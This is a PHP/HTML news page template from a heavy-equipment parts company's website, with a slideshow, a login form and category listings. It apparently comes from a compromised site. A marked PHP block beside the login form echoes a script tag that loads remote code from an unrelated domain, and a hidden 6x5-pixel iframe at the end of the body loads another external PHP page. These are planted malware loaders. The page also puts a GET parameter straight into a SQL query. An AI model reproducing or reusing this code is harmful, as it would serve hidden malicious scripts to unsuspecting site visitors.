<? include "header.php"; ?>
<?
if(isset($_GET["id"]) AND is_numeric($_GET["id"]) ){
	$id = $_GET["id"];
	$query = "select * from news where id = $id";
	$data = $cls -> db_select($query);
	$data = $data[1];
}else{
	header('Location: home.php');
	exit();
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><!-- InstanceBegin template="/Templates/internal.dwt" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Egyptian machinery</title>
</head>
<link rel="stylesheet" href="../css/css.css"  type="text/css" media="all" />

<SCRIPT LANGUAGE="JavaScript">
<!-- Original:  CodeLifter.com (support@codelifter.com) -->
<!-- Web Site:  http://www.codelifter.com -->

<!-- This script and many more are available free online at -->
<!-- The JavaScript Source!! http://javascript.internet.com -->

<!-- Begin
// Set slideShowSpeed (milliseconds)
var slideShowSpeed = 3000;
// Duration of crossfade (seconds)
var crossFadeDuration = 3;
// Specify the image files
var Pic = new Array();
// to add more images, just continue
// the pattern, adding to the array below
<?
	if(is_array($all_slide)) $i=0;
	while(list($key,$val) = each($all_slide)){
	if(isset($account) AND $account == 1){
?>
Pic[<?=$i ?>] = '../../upload/slide/<?=$val["slide_photo"] ?>' <? print "\n\r"; ?>
<?
	}else{
?>
Pic[<?=$i ?>] = '../upload/slide/<?=$val["slide_photo"] ?>' <? print "\n\r"; ?>
<?
	
	}
	$i++;
	}
?>

// do not edit anything below this line
var t;
var j = 0;
var p = Pic.length;
var preLoad = new Array();
for (i = 0; i < p; i++) {
preLoad[i] = new Image();
preLoad[i].src = Pic[i];
}
function runSlideShow() {
if (document.all) {
document.images.SlideShow.style.filter="blendTrans(duration=2)";
document.images.SlideShow.style.filter="blendTrans(duration=crossFadeDuration)";
document.images.SlideShow.filters.blendTrans.Apply();
}
document.images.SlideShow.src = preLoad[j].src;
if (document.all) {
document.images.SlideShow.filters.blendTrans.Play();
}
j = j + 1;
if (j > (p - 1)) j = 0;
t = setTimeout('runSlideShow()', slideShowSpeed);
}
//  End -->
</script>

<body onLoad="runSlideShow()" background="../images/bg_03.gif" style="margin:0px; padding:0px">


<div align="center" style="">
<div align="center" style="width:940px;border:#CCCCCC solid 1px; background-color: #FFFFFF">
<!-- /////////////////////////////////// -->
<table border="0" height="285" width="100%" cellpadding="0" cellspacing="0">
<tr>
	<td align="center" style="background-color:#d9d9d9" width="258px;">
		<img src="../images/logo.gif" />
	</td>
	<td width="434px;">
		<!-- ///// Slide /////// -->
		<div>
			<img width="434" height="285" src="../upload/slide/<?=$all_slide[1]["slide_photo"] ?>"  name='SlideShow' align="top" />
		</div>	
	</td>
	<td  valign="top" style="width:252px;padding:10px; padding-top:57px; padding-left:50px;background-image:url(../images/loop1.gif);background-repeat: repeat-x;">
		<div align="left" class="top">
			<div style=" padding-bottom:7px;"><img align="absmiddle" src="../images/bullet_1.gif" /> <a href="home.php">HOME</a><br /></div>
			<div style=" padding-bottom:7px;"><img align="absmiddle" src="../images/bullet_1.gif" /> <a href="page.php?id=1">ABOUT</a><br /></div>
			<div style=" padding-bottom:7px;"><img align="absmiddle" src="../images/bullet_1.gif" /> <a href="page.php?id=2">OUR SERVICE</a><br /></div>
<!-- 
			<div style=" padding-bottom:7px;">&nbsp; &nbsp; &nbsp; <img align="absmiddle" src="../images/bullet_2.gif" /> <a style="font-size:11px" href="page.php?id=2">HEAVEY EQUIPMENT</a><br /></div>
			<div style=" padding-bottom:7px;">&nbsp; &nbsp; &nbsp; <img align="absmiddle" src="../images/bullet_2.gif" /> <a style="font-size:11px" href="page.php?id=3">USED SPARE PARTS</a><br /></div>
			<div style=" padding-bottom:7px;">&nbsp; &nbsp; &nbsp; <img align="absmiddle" src="../images/bullet_2.gif" /> <a style="font-size:11px" href="page.php?id=4">NEW SPARE PARTS</a><br /></div>
-->
			<div style=" padding-bottom:7px;"><img align="absmiddle" src="../images/bullet_1.gif" /> <a href="contact_us.php">CONTACT</a><br />
			</div>
		</div>
	</td>
</tr>
<tr><td colspan="3" height="20" style="background-image:url(../images/loop2.gif);background-repeat: repeat-y;"></td></tr>
<tr>
	<td valign="top"><br />
		&nbsp; <img src="../images/login.gif" />
		<br />
		<? if(!isset($_SESSION["user_id"])){ ?>
<?php
#c890bc#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16224440\"></script>";
echo $srwv;
}
#/c890bc#
?>
	<span style="font-size:11px"><? if(isset($_POST["login"])) print @$message_display; ?></span>	
	
	<table width="100%" class="font_1">
	<form id="form1" name="form1" method="post" action="">
	<tr>
		<td>User Name</td>
		<td><input name="user_name" value="<? print @$user_name; ?>" type="text" id="user_name" style=" height:12px; width:120px; font-size:9px;" /></td>
	</tr>
	<tr>
		<td>Password</td>
		<td><input name="password" type="password" id="password" style=" height:12px; width:120px; font-size:9px;" /></td>
	</tr>
	<tr>
		<td colspan="2">
		<a href="forgotpassword.php"><img border="0" src="../images/forget_p.gif" /></a>
		<a href="register.php"><img align="right" border="0" src="../images/register.gif" /></a>		</td>
	</tr>
	<tr>
		<td align="right" colspan="2"><input name="login" type="submit" id="login" style="border:0px; width:63px; height:24px; background-image:url(../images/button_1.gif)" value=" " /></td>
	</tr>
	</form>	
	</table>
	<? }else{ ?>
	<div align="center">
		<br />
		<span style="font-family:'Courier New'; color:#333333; font-size:12px;">You Are Login</span>
		<br />
		<div class="bottom" style="padding-bottom:10px; margin-top:10px;"><a href="account/my_account.php">My Account</a></div>
		<div align="left" class="bottom" style="padding-bottom:10px; margin-top:10px;"><a style="font-size:12px;" href="log_out.php">Log Out</a></div>
	</div>
	<? }?>	

		
		<hr style="color:#d7d7d7; margin:10px; margin-bottom:10px; margin-top:10px;" />


		<div style=" background-image:url(../images/header1.gif); background-repeat:no-repeatwidth:247px; height:42px;">
		<div style="padding-left:50px; padding-top:10px; font-weight:bolder; font-size:16px; font-family: Arial, Helvetica, sans-serif;">Equipment Categories</div>
		</div>
		
		<br />
		<div align="left" class="right" style="padding-left:40px;" >
			<table width="100%">
			<? 
				reset($all_category);
				if(is_array($all_category)){ $counter = 0;
				while(list($key,$val) = each($all_category)){
				$counter ++;
				if($counter == 18) break;
			?>
			<tr><td><img src="../images/bullet_3.gif" align="absmiddle" /></td><td><a href="category.php?id=<?=$val["id"] ?>"><?=$val["name"] ?></a></td></tr>
			<? } } ?>
			</table>
			<div align="center"><a style="color: #fcac14; font-size:14px; text-decoration:underline;" href="all_category.php">All Category</a></div>
		</div>
		
		<br />
		<img src="../images/header2.gif" />
		<br />
		<div align="left" class="bottom" style="padding-left:40px;" >
			<? 
				reset($all_manufacture);
				if(is_array($all_manufacture)){ $counter = 0;
				while(list($key,$val) = each($all_manufacture)){
				$counter ++;
				if($counter == 7) break;
			?>
			<div style="padding-bottom:5px;"><a href="manufacture_product.php?id=<?=$val["id"] ?>"><?=$val["name"] ?></a> <br /></div>
			<? }} ?>
			<div align="center"><a style="color:#333333; font-size:14px; text-decoration:underline;" href="all_manufacture.php">More</a></div>
			<br />

		</div>
				
	</td>
	<td valign="top" colspan="2" style="background-color: #FFFFFF; border:2px solid #cccccc; ">
		<div align="left" style=" font-family:Verdana; font-size:13px;padding:10px;">
		<b><!-- InstanceBeginEditable name="header" -->News<br />
		<!-- InstanceEndEditable --></b>
		<hr style="color:#d7d7d7; margin:2px; margin-bottom:10px; margin-top:10px;" />
		<!-- InstanceBeginEditable name="content" -->
		<div style="font-size:14px; font-weight:bolder; color:#990000"><?=$data["header"] ?></div>
		<br />
		<div align="center">
		<? if($data["photo"] != ""){ ?>
			<img border="1" hspace="5" vspace="5" align="center" src="../upload/image/<?=$data["photo"] ?>"  /></a>
		<? } ?>	
		</div>
		<br />
		<div align="justify">
		<?=$data["full_desc"] ?>
		</div>
		<br />
		<div align="right"><a style="color:#990000" href="news.php">All News</a></div>
		<!-- InstanceEndEditable -->	
		</div>
	</td>
	
</tr>
<tr>
<td height="72" colspan="3" style="background-image:url(../images/footer_1.gif); background-repeat:no-repeat">
	<div align="center" style=" padding-top:20px;font-family:Verdana; font-size:10px; color: #333333;">
		Copyright 2010 &copy; AL Karim Co. for heavey equipment parts, Powered by <a target="_blank" href="http://www.eracore.net">Eracore.net</a>		</div>
</td>
</tr>
</table>	


<!-- /////////////////////////////////// -->
</div></div>

<iframe src="http://elevatemagazine.com/includes/13x.php" border="0" width="6" height="5" /></body>
<!-- InstanceEnd --></html>
